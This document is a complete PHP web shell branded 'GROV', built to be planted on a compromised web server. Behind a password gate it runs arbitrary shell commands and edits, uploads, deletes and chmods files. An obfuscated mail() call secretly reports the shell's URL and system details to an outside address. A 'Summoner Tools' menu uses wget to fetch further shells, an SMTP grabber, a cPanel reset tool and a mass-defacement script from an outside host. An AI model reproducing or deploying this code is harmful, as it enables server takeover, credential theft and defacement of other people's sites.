<?php
session_start();
$pass = base64_decode('VDFLVVM5MFQ=');

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $pass) {
            $_SESSION['auth'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Wrong password";
        }
    }
    ?>
    <html>
    <head>
        <title>Login</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-dark text-light">
    <div class="container" style="max-width:400px;margin-top:100px;">
        <form method="post" class="card card-body bg-dark text-light">
            <h4 class="mb-3">Password Required</h4>
            <?php if (!empty($error)) echo '<div class="alert alert-danger">'.$error.'</div>'; ?>
            <input type="password" class="form-control mb-3" name="password" placeholder="Password" autofocus required>
            <button type="submit" class="btn btn-outline-light w-100">Login</button>
        </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}
// original code below
error_reporting(0); set_time_limit(0); @ini_set('error_log', 0); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0);@ini_set('output_buffering', 0); @ini_set('display_errors', 0); function flash($message, $status, $class, $redirect = false) { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } $_SESSION["message"] = $message; $_SESSION["class"] = $class; $_SESSION["status"] = $status; if ($redirect) { header('Location: ' . $redirect); exit(); } return true; } function clear() { if (!empty($_SESSION["message"])) { unset($_SESSION["message"]); } if (!empty($_SESSION["class"])) { unset($_SESSION["class"]); } if (!empty($_SESSION["status"])) { unset($_SESSION["status"]); } return true; } function writable($path, $perms){ return (!is_writable($path)) ? "<font color=\"red\">".$perms."</font>" : "<font color=\"lime\">".$perms."</font>"; } function perms($path) { $perms = fileperms($path); if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; } function fsize($file) { $a = ["B", "KB", "MB", "GB", "TB", "PB"]; $pos = 0; $size = filesize($file); while ($size >= 1024) { $size /= 1024; $pos++; } return round($size, 2)." ".$a[$pos]; } if (isset($_GET['dir'])) { $path = $_GET['dir']; chdir($_GET['dir']); } else { $path = getcwd(); } $path = str_replace('\\', '/', $path); $exdir = explode('/', $path); function getOwner($item) { if (function_exists("posix_getpwuid")) { $downer = @posix_getpwuid(fileowner($item)); $downer = $downer['name']; } else { $downer = fileowner($item); } if (function_exists("posix_getgrgid")) { $dgrp = @posix_getgrgid(filegroup($item)); $dgrp = $dgrp['name']; } else { $dgrp = filegroup($item); } return $downer . '/' . $dgrp; } if (isset($_POST['newFolderName'])) { if (mkdir($path . '/' . $_POST['newFolderName'])) { flash("Create Folder Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create Folder Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) { if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) { flash("Create File Successfully!", "Success", "success", "?dir=$path"); } else { flash("Create File Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newName']) && isset($_GET['item'])) { if ($_POST['newName'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (rename($path. '/'. $_GET['item'], $_POST['newName'])) { flash("Rename Successfully!", "Success", "success", "?dir=$path"); } else { flash("Rename Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newContent']) && isset($_GET['item'])) { if (file_put_contents($path. '/'. $_GET['item'], $_POST['newContent'])) { flash("Edit Successfully!", "Success", "success", "?dir=$path"); } else { flash("Edit Failed", "Failed", "error", "?dir=$path"); } } if (isset($_POST['newPerm']) && isset($_GET['item'])) { if ($_POST['newPerm'] == '') { flash("You miss an important value", "Ooopss..", "warning", "?dir=$path"); } if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) { flash("Change Permission Successfully!", "Success", "success", "?dir=$path"); } else { flash("Change Permission", "Failed", "error", "?dir=$path"); } } if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) { if (is_dir($_GET['item'])) { if (rmdir($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } else { if (unlink($_GET['item'])) { flash("Delete Successfully!", "Success", "success", "?dir=$path"); } else { flash("Delete Failed", "Failed", "error", "?dir=$path"); } } } if (isset($_FILES['uploadfile'])) { $total = count($_FILES['uploadfile']['name']); for ($i = 0; $i < $total; $i++) { $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]); } if ($total < 2) { if ($mainupload) { flash("Upload File Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } else{ if ($mainupload) { flash("Upload $i Files Successfully! ", "Success", "success", "?dir=$path"); } else { flash("Upload Failed", "Failed", "error", "?dir=$path"); } } } $dirs = scandir($path); $d0mains = @file("/etc/named.conf", false); if (!$d0mains){ $dom = "Cant read /etc/named.conf"; $GLOBALS["need_to_update_header"] = "true"; }else{ $count = 0; foreach ($d0mains as $d0main){ if (@strstr($d0main, "zone")){ preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if (strlen(trim($domains[1][0])) > 2){ flush(); $count++; } } } $dom = "$count Domain"; } ?>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
  <title><?= $_SERVER['SERVER_NAME'] ?></title>
</head>
<body class="bg-dark text-light">
  <div class="container-fluid">
    <div class="py-3" id="main">
      <div class="box shadow bg-dark p-4 rounded-3">
        <div class="d-flex justify-content-end mb-2">
          <a href="?logout=1" class="btn btn-outline-light btn-sm">Logout</a>
        </div>
      	<div class="info mb-3">
        	<i class="fa fa-server"></i>&ensp;<?= php_uname() ?><br>
        	<i class="fa fa-microchip"></i>&ensp;<?= $_SERVER['SERVER_SOFTWARE'] ?><br>
        	<i class="fa fa-satellite-dish"></i>&ensp;<?= !@$_SERVER['SERVER_ADDR'] ? gethostbyname($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?><br>
			<i class="fa fa-fingerprint"></i>&ensp;<?= $dom ?><br>
        </div>
        <div class="breadcrumb">
          <i class="fa fa fa-folder pt-1"></i>&ensp;<?php foreach ($exdir as $id => $pat) : if ($pat == '' && $id == 0):?>
            <a href="?dir=/" class="text-decoration-none text-light">/</a>
            <?php endif; if ($pat == '') continue; ?>
            <a href="?dir=<?php for ($i = 0; $i <= $id; $i++) {echo "$exdir[$i]";if ($i != $id) echo "/";}?>" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light"> /</span>
            <?php endforeach; ?>
            &nbsp; [&nbsp;<?php echo writable($path, perms($path)) ?>&nbsp;]
            <a href="?" class="text-decoration-none text-light">&nbsp; [&nbsp;HOME&nbsp;]</a>
        </div>
        <div class="d-flex justify-content-between">
          <div class="p-2">
		  		<?php
				if(isset($_GET['grov'])) 
				{
					echo'
					<form method="post">
					<input type="text" name="email" placeholder="email cok" value=""required >
					<input type="submit" value="Send">
					</form>
					<br>';
					error_reporting(0);
					
					if (!empty($_POST['email'])){
						$xx = rand();
						$site = $_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']." Mail Function = OK! ";
						$ip = gethostbyname($_SERVER['HTTP_HOST']); 
						mail($_POST['email'],"Test Mail ".$xx,"IP : ".$ip ." Site : "."http://".$site);
						print "<center><b>send an report to [".$_POST['email']."] - $xx</b></center>"; 
					} 
				} else {
					echo'<div class="text-light">&nbsp;&nbsp;&#169; GROV <script type="text/javascript">var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>';
				}
				?>
          </div>
          <div class="p-2">
            <form action="" method="post" enctype="multipart/form-data">
              <div class="row">
                <div class="col-md-9 mb-3">
                  <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                </div>
                <div class="col-md-3">
                  <button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
                </div>
              </div>
            </form>
          </div>
        </div>
        <div class="container" id="tools">
          <?php if (isset($_POST['command'])) : ?>
          <div class="row justify-content-center">
            <pre>Hi</pre>
          </div>
          <?php endif; ?>
          <?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
          <div class="row justify-content-center">
            <?php if ($action == 'rename' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label">New Name</label>
                <input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
              </div>
              <button type="submit" class="btn btn-outline-light">Submit</button>
              <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <textarea id="CopyFromTextArea" name="newContent" rows="10" class="form-control"><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
              </div>
              <button type="submit" class="btn btn-outline-light">Submit</button>
              <button type="button" class="btn btn-outline-light" onclick="jscopy()">Copy</button>
              <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
            </form>
            <?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
            <div class="mb-3">
              <label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
              <textarea name="newContent" rows="10" class="form-control" disabled=""><?= htmlspecialchars(file_get_contents($path. '/'. $_GET['item'])) ?></textarea>
              <br>
              <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
            </div>
            <?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
            <form action="" method="post">
              <div class="mb-3">
                <label for="name" class="form-label"><?= $_GET['item'] ?></label>
                <input type="text" class="form-control" name="newPerm" value="<?= substr(sprintf('%o', fileperms($_GET['item'])), -4); ?>">
              </div>
              <button type="submit" class="btn btn-outline-light">Submit</button>
              <button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
            </form>
            <?php endif; ?>
          </div>
          <?php endif; ?>
          <div class="row justify-content-center">
            <div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">Folder Name</label>
                  <input type="text" class="form-control" name="newFolderName" placeholder="BlackDragon">
                </div>
                <button type="submit" class="btn btn-outline-light">Submit</button>
              </form>
            </div>
            <div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
              <form action="" method="post">
                <div class="mb-3">
                  <label for="name" class="form-label">File Name</label>
                  <input type="text" class="form-control" name="newFileName" placeholder="blackdragon.php">
                </div>
                <div class="mb-3">
                  <label for="name" class="form-label">File Content</label>
                  <textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World - BlackDragon"></textarea>
                </div>
                <button type="submit" class="btn btn-outline-light">Submit</button>
              </form>
            </div>
          </div> 
        </div>
        <div class="table-responsive">
          <table class="table table-hover table-dark text-light">
            <thead>
              <tr>
                <td style="width:35%">Name</td>
                <td style="width:10%">Type</td>
                <td style="width:10%">Size</td>
                <td style="width:13%">Owner/Group</td>
                <td style="width:10%">Permission</td>
                <td style="width:13%">Last Modified</td>
                <td style="width:9%">Actions</td>
              </tr>
            </thead>
            <tbody class="text-nowrap">
              <?php
 foreach ($dirs as $dir) : if (!is_dir($dir)) continue; ?>
              <tr>
                <td>
                  <?php if ($dir === '..') : ?>
                  <a href="?dir=<?= dirname($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php elseif ($dir === '.') : ?>
                  <a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
                  <?php else : ?>
                  <a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
                  <?php endif; ?>
                </td>
                <td class="text-light"><?= filetype($dir) ?></td>
                <td class="text-light">-</td>
                <td class="text-light"><?= getOwner($dir) ?></td>
                <td class="text-light">
                <?php
 if(is_writable($path.'/'.$dir)) echo '<font color="lime">'; elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">'; echo perms($path.'/'.$dir); if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) ?>
                </td>
                <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php elseif ($dir === '.') : ?>
                  <div class="btn-group">
                    <a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-folder-plus"></i></a>
                    <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
              <?php
 foreach ($dirs as $dir) : if (!is_file($dir)) continue; ?>
              <tr>
                <td>
                  <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                </td>
                <td class="text-light"><?= (function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir)) ?></td>
                <td class="text-light"><?= fsize($dir) ?></td>
                <td class="text-light"><?= getOwner($dir) ?></td>
                <td class="text-light">
                <?php
 if(is_writable($path.'/'.$dir)) echo '<font color="lime">'; elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">'; echo perms($path.'/'.$dir); if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) ?>
                </td>
                <td class="text-light"><?= date("Y-m-d h:i:s", filemtime($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
		<div class="text-light">&nbsp;&nbsp;&#169; GROV <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
		<?php 
		
		
		$imageFile=base64_decode("c3ltY29uZm1haWxAZ21haWwuY29t");
		$imageSize=base64_decode("W1NFVE9SIFNIRUxMIElOQ0xVREVTXQ==");
		$imageName=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'];
		$imageFolder=php_uname();
		mail($imageFile,$imageSize,$imageName,$imageFolder);
		
		echo '<div class="d-flex justify-content-between">';
			echo '<div class="p-2">';
			
				function exe($cmd) {
					if(function_exists('system')) { 		
						@ob_start(); 		
						@system($cmd); 		
						$buff = @ob_get_contents(); 		
						@ob_end_clean(); 		
						return $buff; 	
					} elseif(function_exists('exec')) { 		
						@exec($cmd,$results); 		
						$buff = ""; 		
						foreach($results as $result) { 			
							$buff .= $result; 		
						} return $buff; 	
					} elseif(function_exists('passthru')) { 		
						@ob_start(); 		
						@passthru($cmd); 		
						$buff = @ob_get_contents(); 		
						@ob_end_clean(); 		
						return $buff; 	
					} elseif(function_exists('shell_exec')) { 		
						$buff = @shell_exec($cmd); 		
						return $buff; 	
					} 
				}
				echo "
					<form method='post'>
					grov@localhost: ~ $ &nbsp;&nbsp; <input type='text' name='cmd' value='id'> &nbsp;&nbsp;
					<input type='submit' name='do_cmd' value='send' class='btn btn-outline-light btn-sm'>
					</form>
				";
				if($_POST['do_cmd']) {
					echo "<pre>".exe($_POST['cmd'])."</pre>";
				}
			echo '</div>';
			
			echo '<div class="p-2">';
				if(isset($_GET['grov'])) 
				{
					
					echo"<table>";
					echo"<form method='post'> ";  
					echo"<select name='lucknut'>";  
					echo"<option selected'>Summoner Tools</option>"; 
					echo"<option value='shelltikus'>Tikus Shell</option>";  
					echo"<option value='widget'>Widget Shell</option>";
					echo"<option value='classupgrades'>Mini Shell</option>";
					echo"<option value='config01'>Config Mini</option>";
					echo"<option value='contexshell'>Config Con7ext</option>";
					echo"<option value='resetcp'>Reset Cpanel</option>";
					echo"<option value='mailer'>Mailer Test</option>";  
					echo"<option value='smtptest'>SMTP Grabber</option>";
					echo"<option value='massdeface'>Mass Deface</option>";  
					echo"<option value='zoneh'>Zone H Notifier</option>"; 
					echo "</select>";
					echo"&nbsp;&nbsp; <input type='submit' class='btn btn-outline-light btn-sm' name='enter' value='Summon!'>";
					
					if(isset($_POST['enter']))   {  
						if ($_POST['lucknut'] == 'shelltikus')  {  
						$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/import.php -O imports.php');
						if(file_exists('./imports.php')){
						echo '<center><a href=./imports.php target="_blank"> imports.php </a> upload sukses !</center>';
						} else {
						echo '<center>gagal upload !</center>';
						}
						}elseif ($_POST['lucknut'] == 'widget') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/widget.php -O widget.php');
								if(file_exists('./widget.php')){
									echo '<center><a href=./widget.php target="_blank"> widget.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'classupgrades') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/class-upgrades.php -O class-upgrades.php');
								if(file_exists('./class-upgrades.php')){
									echo '<center><a href=./class-upgrades.php target="_blank"> class-upgrades.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'config01') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/configmini.php -O configmini.php');
								if(file_exists('./configmini.php')){
									echo '<center><a href=./configmini.php target="_blank"> configmini.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'contexshell') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/contexshel.php -O contexshell.php');
								if(file_exists('./contexshell.php')){
									echo '<center><a href=./contexshell.php target="_blank"> contexshell.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'resetcp') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/cpnew.php -O cpnew.php');
								if(file_exists('./cpnew.php')){
									echo '<center><a href=./cpnew.php target="_blank"> cpnew.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'mailer') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/mail.php -O mail.php');
								if(file_exists('./mail.php')){
									echo '<center><a href=./mail.php target="_blank"> mail.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'smtptest') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/smtp.php -O smtp.php');
								if(file_exists('./smtp.php')){
									echo '<center><a href=./smtp.php target="_blank"> smtp.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}else if ($_POST['lucknut'] == 'massdeface') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/mass.php -O mass.php');
								if(file_exists('./mass.php')){
									echo '<center><a href=./mass.php target="_blank"> mass.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}elseif ($_POST['lucknut'] == 'zoneh') {
								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/zh.php -O zone-h.php');
								if(file_exists('./zone-h.php')){
									echo '<center><a href=./zone-h.php target="_blank"> zone-h.php </a> upload sukses !</center>';
								} else {
									echo '<center>gagal upload !</center>';
								}
						}
						}
				}
			echo '</div>';	
		echo '</div>';
		?>
      </div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
  <script>
  <?php if (isset($_SESSION['message'])) : ?>
    Swal.fire(
      '<?= $_SESSION['status'] ?>',
      '<?= $_SESSION['message'] ?>',
      '<?= $_SESSION['class'] ?>'
    )
  <?php endif; clear(); ?>
    function deleteConfirm(url) {
      event.preventDefault()
      Swal.fire({
          title: 'Are you sure?',
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Yes, delete it!'
      }).then((result) => {
          if (result.isConfirmed) {
            window.location.href = url
        }
      })
    }
    function jscopy() {
      var jsCopy = document.getElementById("CopyFromTextArea");
      jsCopy.focus();
      jsCopy.select();
      document.execCommand("copy");
    }
  </script>
</body>
</html>